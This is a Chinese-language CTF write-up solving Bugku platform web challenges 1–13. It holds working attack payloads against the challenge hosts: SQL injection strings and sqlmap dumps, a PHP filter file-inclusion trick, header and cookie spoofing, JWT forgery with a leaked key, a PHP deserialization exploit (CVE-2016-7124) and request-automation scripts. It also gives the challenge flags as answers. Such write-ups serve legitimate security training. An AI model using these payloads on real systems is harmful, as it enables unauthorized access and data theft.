---
title: CTF 论剑场 Web1-13 WriteUp
tags:
  - Writeup
  - CTF
date: 2019-04-25 20:58:00
---
**文章首发于[安恒网络空间安全讲武堂](https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486357&idx=1&sn=df9932a0e456f3de8a344d040135a69c&chksm=fbf791e5cc8018f3c03eae24e53f631ceb1b2eeefdd695ab7652032d44cf4c91cbb11dbc4c58&xtrack=1&scene=0&subscene=131&clicktime=1552640942&ascene=7&devicetype=android-27&version=2700033b&nettype=cmnet&abtest_cookie=BAABAAoACwASABMABAAjlx4AVpkeAMGZHgDRmR4AAAA%3D&lang=zh_CN&pass_ticket=P%2F37gdIywaM0N9Qk5Tattf%2FiDp493LUzzutPnqoulvtkArMTTfAac%2BKT6RPWIFwa&wx_header=1)**

> 平台地址：[https://new.bugku.com/](https://new.bugku.com/)

<!--more-->


## web1 simple bypass

![](/assets/images/move/1551542788618-06d2b6ca-1a0f-4e81-be52-3a6131923bcd.png)

**extract** — 从数组中将变量导入到当前的符号表，**trim** — 去除字符串首尾处的空白字符（或者其他字符）。

Payload:`a=&b=`即可成功绕过，回显`flag{c3fd1661da5efb989c72b91f3c378759}`。

## web2 Quick calc

```html
<html>
<head>
<title></title>
</head>
<body>
<p>
请在三秒之内计算出以下式子，计算正确就的到flag哦！<br/>
418*693117+32*(9976+2487)</p>
<form action="" method="post">
计算结果:<input type="text" name="result"/>
<input type="submit" value="提交"/>
</form>
</body>
</html>
```

Payload:

```py
import re
import requests

url = 'http://123.206.31.85:10002/'
r = requests.session()
text = r.get(url).text
calc = str(re.findall("(.*?)</p>", text))[2:-2]
ans = eval(calc)
data = {'result':ans}
res = r.post(url, data)
print(res.text)
```

即可获得`flag{b37d6bdd7bb132c7c7f6072cd318697c}`。


## web3 php伪协议

![](/assets/images/move/1551601290062-7fe40dd9-5f11-4bdb-83d7-45510e4d63ba.png)

尝试上传`php`文件时回显`Sorry, only PNG files are allowed.`。

判断为服务端白名单验证，这里参考`upload-labs`题解思路进行测试。

![](/assets/images/move/1551601844340-2598aaa1-71ac-4ae1-88b4-b023e390a8e7.png)

测试无果,发现`url`的`op`参数首页为`op=home`上传页面为`op=upload`，猜测存在文件包含漏洞~

`op=1`回显：`Error no such page`。

> 参考: [php 伪协议](https://lorexxar.cn/2016/09/14/php-wei/)

使用php伪协议尝试传参：`?op=php://filter/read=convert.base64-encode/resource=flag`，回显`PD9waHAgCiRmbGFnPSJmbGFne2UwMGY4OTMxMDM3Y2JkYjI1ZjZiMWQ4MmRmZTU1NTJmfSI7IAo/Pgo=`。


Base64 decode：

```php
<?php 
$flag="flag{e00f8931037cbdb25f6b1d82dfe5552f}"; 
?>
```

## web4 万能密码

![](/assets/images/move/1551617164817-353ffa97-27b8-4509-973d-0cc503b475b4.png)

Payload: 万能密码, 注入点在password，`password=' or '1'='1`成功登陆。

flag{7ae7de60f14eb3cbd9403a0c4328598d}

## web5 injection

hint: injection

![](/assets/images/move/1551617377026-b8dac252-2847-46ce-82e6-00d9e2797a0a.png)

```sql
> sqlmap -u "http://47.95.208.167:10005/?mod=read&id=1" -p "id" -v 3

Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: mod=read&id=2 AND 6548=6548
    Vector: AND [INFERENCE]

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: mod=read&id=2 RLIKE SLEEP(5)
    Vector: RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))


    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: mod=read&id=-1362 UNION ALL SELECT NULL,CONCAT(0x716b706b71,0x6b705a4550514d7864627845624c7252716d53456758474165446c66654e4a6b43714d776b767255,0x716b6a6b71),NULL,NULL-- vymr
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
---
[21:03:29] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12

...

> sqlmap -u "http://47.95.208.167:10005/?mod=read&id=1" -p "id" -v 3 -D "web5" -T "flag" -C "flag" --dump

Database: web5
Table: flag
[1 entry]
+----------------------------------------+
| flag                                   |
+----------------------------------------+
| flag{320dbb1c03cdaaf29d16f9d653c88bcb} |
+----------------------------------------+

```

## web6 XFF、F12

![](/assets/images/move/1551618812994-0b603a6f-4f92-4202-895e-e6802019c1f9.png)

提交`user=admin' or '1'='1`、`pass=' or '1'='1`后回显：IP禁止访问，请联系本地管理员登陆，IP已被记录.

猜想`X-Forward-For: 127.0.0.1`，这里通过Firefox插件X-Forwarded-For Header直接修改。

提交`user=admin&pass=admin`/`user=amdin&pass=1`后回显：Invalid credentials! Please try again!

**F12**查看源代码在5023行：`<!-- dGVzdDEyMw== -->`。

base64.decode后得到密码`test123`。

登陆后回显：`The flag is: 85ff2ee4171396724bae20c0bd851f6b`.



## web7 吃个小饼干吗？

吃个小饼干吗？

![](/assets/images/move/1551619734707-686930cc-6c53-49f8-b228-cf0821b0dc66.png)

注册测试用户后登陆，`home.php`页面如下：

![](/assets/images/move/1551619974751-9fbf6c43-3a3d-4bfe-ada4-b057fb000c30.png)

任意内容提交回显相同页面。

想起小饼干的翻译是cookie，在报文中发现如下cookie字段:

```http
Set-Cookie: u=351e76680321232f297a57a5a743894a0e4a801fc3
Set-Cookie: r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff
# 规律如下
Set-Cookie: u=351e766803 21232f297a57a5a743894a0e4a801fc3
Set-Cookie: r=351e766803 d63c7ede8cb1e1c8db5e51c63fd47cff
# md5(admin, 32) = 21232f297a57a5a743894a0e4a801fc3
# d63c7ede8cb1e1c8db5e51c63fd47cff 解密明文为 limited
```

尝试cookie欺骗~

![](/assets/images/move/1551620792584-108d3bed-b625-480d-ad4b-2831a74ad4f0.png)


## web8 SimpleSQLI

![](/assets/images/move/1551621020730-42582aa4-6221-4dfb-ba96-bd3f9fa449db.png)

注册测试账户后，个人信息更新页面如下：

![](/assets/images/move/1551947568700-bd3044d2-2fd5-4a9d-b1c0-dbcba4945c34.png)

`dirsearch`下发现有`/.idea/workspace.xml`泄露以及`www.tar.gz`源码文件。

![](/assets/images/move/1551947763373-fdc204b3-3d33-4ebc-8262-66badae669e3.png)

update.php中age处存在数字型注入点,payload如下：

```sql
# 直接回显
(select group_concat(description) from (select description from users where username=0x61646d696e)x)
# 逐位爆破(注意csrf-token的处理)
0|conv(hex(substr((select description from (select * from users where username like 0x61646d696e)a),1,1)), 16, 10)
conv(hex(substr((select description from (select * from users where username regexp 0x61646d696e limit 0,1)a),1,1)), 16, 10)
```

![](/assets/images/move/1551948009156-5c838653-e51b-4fcf-9478-6f9c36dd9401.png)

## web9 PUT me message!

put me a message bugku then you can get the flag

![](/assets/images/move/1551947338584-12ce0c3b-56f5-44ac-8ee0-1dee87637fb9.png)

Base64.decode->flag{T7l8xs9fc1nct8NviPTbn3fG0dzX9V}.

## web10 在线日记本

hint:JWT你需要了解一哈.

![](/assets/images/move/1551948585023-a00d614d-957c-40e4-8339-14bbd7098a70.png)

![](/assets/images/move/1551948519660-cdd3f789-bfe0-4d0e-a255-0ed216ea6a3f.png)


base32.decode("NNVTU23LGEZDG===")=kk:kk123,username=kk&password=kk123提交登录。

![](/assets/images/move/1551964938680-d46d6c0d-cb8f-4e31-964b-820ff7639840.png)

![](/assets/images/move/1551965072453-479286a8-aca1-430a-a054-21b8d119ce66.png)

下载`L3yx.php.swp`文件，通过`vi -r L3yx.php`:wq还原文件。

```php
<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>在线日记本</title>
<form action="" method="POST">
  <p>username: <input type="text" name="username" /></p>
  <p>password: <input type="password" name="password" /></p>
  <input type="submit" value="login" />
</form>
<!--hint:NNVTU23LGEZDG===-->
</html>

<?php
    error_reporting(0);
    require_once 'src/JWT.php';

    const KEY = 'L3yx----++++----';

    function loginkk()
    {
        $time = time();
        $token = [
          'iss'=>'L3yx',
          'iat'=>$time,
          'exp'=>$time+5,
          'account'=>'kk'
        ];
        $jwt = \Firebase\JWT\JWT::encode($token,KEY);
        setcookie("token",$jwt);
        header("location:user.php");
    }

    if(isset($_POST['username']) && isset($_POST['password']) && $_POST['username']!='' && $_POST['password']!='')
    {
        if($_POST['username']=='kk' && $_POST['password']=='kk123')
        {
            loginkk();
        }
        else
        {
            echo "账号或密码错误";
        }
    }
?> 
```

> JWT学习参考：[JSON Web Token 入门教程 - 阮一峰](http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)


获取`Key='L3yx----++++----'`，使用`kk`账户登录得到：

```php
# Header.Payload.Signature
token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTUxOTY1ODIxLCJleHAiOjE1NTE5NjU4MjYsImFjY291bnQiOiJrayJ9.ImnDWj4kYTxYyGfrOt-M0LCSwYSC8VtjdTfP03MLOyg
# Header
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
# Payload
eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTUxOTY1ODIxLCJleHAiOjE1NTE5NjU4MjYsImFjY291bnQiOiJrayJ9.
# Signature
ImnDWj4kYTxYyGfrOt-M0LCSwYSC8VtjdTfP03MLOyg
```

![](/assets/images/move/1551966379732-44c7c202-628b-475e-9c9b-7f4e3e1c487b.png)

更改account为L3yx,提前计算好iat和exp构造Token发包到user.php~

- [JSON Web Tokens - jwt.io](https://jwt.io/)

![](/assets/images/move/1551967336790-04658964-70ef-4afb-b598-d518bf5c8820.png)

![](/assets/images/move/1551967241165-ef835703-dbac-4068-b62f-848dffa72797.png)

## web11 MD5截断比较

```html
<html>
<title>robots</title>
<body>
We han't anything!
</body>
</html>
```

访问`.robots`发现：Disallow: /shell.php，打开/shell.php.

![](/assets/images/move/1552203976235-47cbb07b-bf7e-4e1b-a80f-c4912ba0b5f6.png)

可知为md5截断比较~ 每次刷新页面匹配值会改变，这里采用短时间生成大量MD5，牺牲空间来换取时间~

```python
# -*- coding: utf-8 -*-
import hashlib
sum = []
j = 0
f = open("gen_md5.txt", "a")
for i in xrange(1000000000):
    tmp = (hashlib.md5(str(i)).hexdigest(),i)
    sum.append(tmp)
    j = j+1
    if(j==10000000):
        for i in sum:
            f.write("{0} {1}".format(i,"\n"))
        j=0
        sum = []
f.close()
```

执行命令正则匹配：`cat gen_md5.txt | grep  \(\'str`检索符合的MD5~

![](/assets/images/move/1552206054283-b41ae692-04d1-4a19-a8aa-8cd17a0575e9.png)

得到:flag{e2f86fb5f75da4999e6f4957d89aaca0}.

## web12 unserialize

hint:时间好长啊

![](/assets/images/move/1552206455406-5a9f8909-4df0-44c7-922f-1cb8b307ae44.png)

F12检查源代码发现注释掉的PHP代码：

```php
class Time{
	public $flag = ******************;
	public $truepassword = ******************;
	public $time;
	public $password ;
	public function __construct($tt, $pp) {
            $this->time = $tt;
            $this->password = $pp;
        }
	function __destruct(){
		if(!empty($this->password))
		{
			if(strcmp($this->password,$this->truepassword)==0){
				echo "<h1>Welcome,you need to wait......<br>The flag will become soon....</h1><br>";
				if(!empty($this->time)){
					if(!is_numeric($this->time)){
						echo 'Sorry.<br>';
						show_source(__FILE__);
					}
					else if($this->time < 11 * 22 * 33 * 44 * 55 * 66){
						echo 'you need a bigger time.<br>';
					}
					else if($this->time > 66 * 55 * 44 * 33 * 23 * 11){
						echo 'you need a smaller time.<br>';
					}
					else{
						sleep((int)$this->time);
						var_dump($this->flag);
					}
					echo '<hr>';
				}
				else{
					echo '<h1>you have no time!!!!!</h1><br>';
				}
			}
			else{
				echo '<h1>Password is wrong............</h1><br>';
			}
		}
		else{
			echo "<h1>Please input password..........</h1><br>";
		}
	}
	function __wakeup(){
		$this->password = 1; echo 'hello hacker,I have changed your password and time, rua!';
	}
}
if(isset($_GET['rua'])){
	$rua = $_GET['rua'];
	@unserialize($rua);
}
else{
	echo "<h1>Please don't stop rua 233333</h1><br>";
}

```

典型的`PHP反序列化题目`，可以参考：[PHP反序列化由浅入深](https://xz.aliyun.com/t/3674)学习了解~

简单审计思路：通过GET传值`rua`后进行反序列化, unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。__destruct()会在对象的所有引用都被删除或者当对象被显式销毁时执行，想要获取`flag`，我们需要`rua`满足一下条件：

- strcmp($this->password,$this->truepassword)==0
- $this->time < 11 * 22 * 33 * 44 * 55 * 66 & $this->time > 66 * 55 * 44 * 33 * 23 * 11
- sleep((int)$this->time)

绕过方法:

- 绕过__wakeup的执行(CVE-2016-7124):**当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行**，修改对象属性个数。
- 绕过strcmp: Php5.3之后版本使用strcmp比较一个字符串和数组的话,将不再返回-1而是返回0，构造password数组。
- 绕过sleep(): (1)使用16进制表示`0x`开头，强制类型转化时会转化为`0`；(2)使用科学计数法绕过，`1.3E9`。

![](/assets/images/move/1552210443162-5ead5cb9-d080-4b2d-9930-4523f6b3d1c0.png)

构造脚本：

```php
<?php
class Time{
	public $time;
	public $password;
	public function __construct($tt, $pp) {
            $this->time = $tt;
            $this->password = $pp;
    }
}
$array = array(
    0 => "bar",
    1 => "foo",
);
$time = '0x4d7c6d00';
$rua = new Time($time, $array);
echo serialize($rua);
//O:4:"Time":2:{s:4:"time";s:10:"0x4d7c6d00";s:8:"password";a:2:{i:0;s:3:"bar";i:1;s:3:"foo";\}\}
?>
```

Payload:`rua=O:4:"Time":3:{s:4:"time";s:10:"0x4d7c6d00";s:8:"password";a:2:{i:0;s:3:"bar";i:1;s:3:"foo";\}\}`.

![](/assets/images/move/1552209742559-b1448e4b-0ab4-407b-8f5c-981e329b9eee.png)

## web13 to be faster

![](/assets/images/move/1552211162455-8fc677d8-2106-4a5d-80a9-5e2f933a7c82.png)

用BurpSuite抓包分析如下:

![](/assets/images/move/1552211686579-15551a38-270c-4586-ab8d-155753597abb.png)

在response Header头里发现了`Password`和`Hint`字段，base64解密`Password`后得到flag{f4970aacbacfba9e57ddbf998fa2e29d}，提交错误~

Hint: Seeing is not believing, maybe you need to be faster!

尝试将Password解密后flag{}里面包含的字段提交回显如下:

![](/assets/images/move/1552219442516-2fd466c3-8f40-4388-8cd2-983db0a869f8.png)

推测需要先发送一个请求截取Password字段，然后base解密取flag{}内包含的值作为password的值发包，速度要快。

Payload:

```python
import requests
import base64
url = 'http://123.xxx.xxx.85:10013/index.php'
r = requests.session()
r1 = r.post(url, data = {'password':'flag'})
Password = r1.headers['Password']
password = str(base64.b64decode(Password), 'utf-8')[5:-1]
r2 = r.post(url, data = {'password':password})
print(r2.text)
```

![](/assets/images/move/1552220059150-18b9cb9e-a1f6-4e18-b8cc-85725c7ea97f.png)



